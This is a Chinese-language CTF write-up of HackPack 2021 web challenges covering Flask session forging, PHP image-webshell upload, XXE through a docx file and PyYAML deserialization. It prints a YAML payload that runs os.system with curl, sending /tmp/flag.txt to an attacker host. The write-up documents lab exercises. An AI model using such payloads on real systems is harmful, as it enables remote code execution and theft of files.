---
title: HackPack 2021
categories: 赛题wp
---

# 前言
这次 web挺基础的，就是想的多了，flask-session那道一直往JWT那里靠，暴力破解密钥的

---
# "N"ot "G"am"I"ng a"N"ymore in "X"mas

- 考点：nginx有时有些难以挖掘的 bug，需要看到更详细的 `debug 级别的日志`

打开题目：

![](https://img-blog.csdnimg.cn/20210418222245962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
修改 `debug=1`

<!--more-->
![](https://img-blog.csdnimg.cn/20210418222645287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问那个路径：

![](https://img-blog.csdnimg.cn/20210418222716676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# All-about-resetting
- Flask-session


点击 login 没有反应：

![](https://img-blog.csdnimg.cn/20210418222804463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
 
点击忘记密码，抓包查看：发现`npantel@ncsu.edu` 

![](https://img-blog.csdnimg.cn/20210418222842916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
填入这个邮箱抓包：发现跳转到 `/reset2`

![](https://img-blog.csdnimg.cn/20210418222919593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
返回：

![](https://img-blog.csdnimg.cn/2021041822293999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
到这里围绕的地方可以是 `伪造session`，这里session的形式很像jwt，围绕jwt做了很长时间不对

然后就用 `flask-unsign` 去解 cookie：

![](https://img-blog.csdnimg.cn/20210418223017154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
得到答案，提交得到 flag：

![](https://img-blog.csdnimg.cn/20210418223038995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# Indead
- 文件上传


正常上传文件

![](https://img-blog.csdnimg.cn/20210418223250347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包找到路径，猜一波：获得flag.txt

![](https://img-blog.csdnimg.cn/20210418224728559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


010打开后发现是 png，修改后缀：

![](https://img-blog.csdnimg.cn/20210418223509171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

直接是假 flag

访问 `robots.txt` (一定要养成习惯)

![](https://img-blog.csdnimg.cn/20210418223559579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

这肯定是源码泄露

根据上面上传过程中发现的 `core.php`,查看其源码：

![](https://img-blog.csdnimg.cn/20210418223632721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
正常上传图片马，抓包看到路径，`eval被ban`

用 `system` 代替

![](https://img-blog.csdnimg.cn/20210418223658677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
淦！一直以为这是个假flag

![](https://img-blog.csdnimg.cn/20210418223750282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# Indead 2
- XXE

提示：flag.txt在/var/www/下（这不提示那就只能靠猜了）

比上题多了一个docx上传点，存在检测，不能上传其他文件

那就先正常上传一个docx：

![](https://img-blog.csdnimg.cn/20210418223833485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
既然提到了xml就感觉是 xxe

众所周知，docx是个zip文件，当其被压缩时包含`xml文档`

![](https://img-blog.csdnimg.cn/20210418223858750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
构造xxe：

![](https://img-blog.csdnimg.cn/2021041822391129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
替换原来docx的 document.xml：

![](https://img-blog.csdnimg.cn/2021041822394429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
成功外带出来

---
# Yaml(PyYaml反序列化)
- CVE-2020-1747
- 地址：https://yaml-2-json.ctf2021.hackpack.club/

[浅谈PyYAML反序列化漏洞](https://xz.aliyun.com/t/7923#toc-0)

>YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。

![](https://img-blog.csdnimg.cn/20210418224026729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210418224037439.png#pic_center)
抓包修改权限：

![](https://img-blog.csdnimg.cn/20210418224051217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

开启 apache2 服务，此处需要公网

执行命令：
```
!!python/object/apply:os.system ["curl http://x.x.x.x/?`cat /tmp/flag.txt`"]
```
![](https://img-blog.csdnimg.cn/20210418232331253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

查看apache2 的日志
![](https://img-blog.csdnimg.cn/20210418232303351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)flag{Py_PyYaml_Yaml_Py}
